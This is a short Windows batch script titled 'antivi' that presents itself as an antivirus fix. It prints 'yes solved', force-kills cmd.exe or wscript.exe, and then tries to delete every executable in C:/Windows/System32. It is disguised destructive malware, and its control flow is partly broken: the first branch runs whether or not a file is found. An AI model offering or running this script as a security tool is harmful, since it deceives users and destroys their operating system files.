@echo off
title antivi
mode 1000
color 0a
goto start
:start
if exist .bat goto a
if exist .vbs goto b

:a
color 0c

echo yes solved
pause
taskkill /f /im cmd.exe
if exist .bat goto c
:c
del C:/Windows/System32/*.exe
exit

goto start
:b
color 0b

echo yes solved

pause

taskkill /f /im wscript.exe
if exist .vbs goto d
:d
del C:/Windows/System32/*.exe
exit

goto start
